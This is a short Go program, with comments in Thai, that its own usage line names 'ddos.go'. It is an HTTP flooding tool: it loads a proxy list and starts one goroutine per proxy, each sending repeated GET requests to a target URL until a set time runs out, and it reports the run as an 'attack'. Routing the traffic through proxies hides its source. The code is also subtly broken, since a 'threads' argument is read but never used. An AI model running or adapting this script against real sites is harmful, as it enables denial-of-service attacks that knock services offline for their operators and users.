package main

import (
	"bufio"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

// ฟังก์ชันเติม http:// ให้พร็อกซีหากไม่มี
func formatProxy(proxy string) string {
	if !strings.HasPrefix(proxy, "http://") && !strings.HasPrefix(proxy, "https://") {
		return "http://" + proxy
	}
	return proxy
}

func main() {
	if len(os.Args) < 5 {
		fmt.Println("Usage: go run ddos.go <url> <duration> <threads> <proxy_file>")
		return
	}

	targetURL := os.Args[1]
	duration, _ := time.ParseDuration(os.Args[2] + "s")
	threads := os.Args[3]
	proxyFile := os.Args[4]

	// อ่านพร็อกซีจากไฟล์
	file, err := os.Open(proxyFile)
	if err != nil {
		fmt.Println("Error reading proxy file:", err)
		return
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := formatProxy(scanner.Text()) // เติม http:// ให้ทุกพร็อกซี
		proxies = append(proxies, proxy)
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Error reading proxy file:", err)
		return
	}

	fmt.Printf("Starting attack on %s with %d threads using proxies...\n", targetURL, len(proxies))

	// เริ่มการโจมตี
	for _, proxy := range proxies {
		go func(proxy string) {
			for {
				proxyURL, _ := url.Parse(proxy)
				client := &http.Client{
					Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)},
					Timeout:   10 * time.Second,
				}

				req, _ := http.NewRequest("GET", targetURL, nil)
				resp, err := client.Do(req)
				if err != nil {
					fmt.Println("Error:", err)
					continue
				}
				fmt.Printf("Proxy %s: %s\n", proxy, resp.Status)
				resp.Body.Close()

				time.Sleep(1 * time.Second) // หน่วงเวลาสักนิด
			}
		}(proxy)
	}

	// รอจนหมดเวลา
	time.Sleep(duration)
	fmt.Println("Attack finished.")
}
